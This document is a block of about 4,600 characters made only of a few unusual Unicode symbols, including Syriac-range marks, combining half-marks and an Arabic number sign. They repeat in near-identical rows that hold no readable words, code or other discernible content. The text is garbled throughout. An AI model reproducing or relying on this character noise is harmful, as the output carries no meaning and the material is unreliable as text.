࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬